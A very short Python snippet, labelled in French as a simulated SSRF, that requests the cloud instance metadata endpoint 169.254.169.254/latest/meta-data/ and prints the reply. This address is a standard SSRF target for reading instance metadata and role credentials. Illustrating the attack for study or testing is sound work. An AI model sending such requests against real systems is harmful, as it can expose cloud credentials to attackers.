import requests

# SSRF simulée
url = "http://169.254.169.254/latest/meta-data/"
r = requests.get(url)
print(r.text)
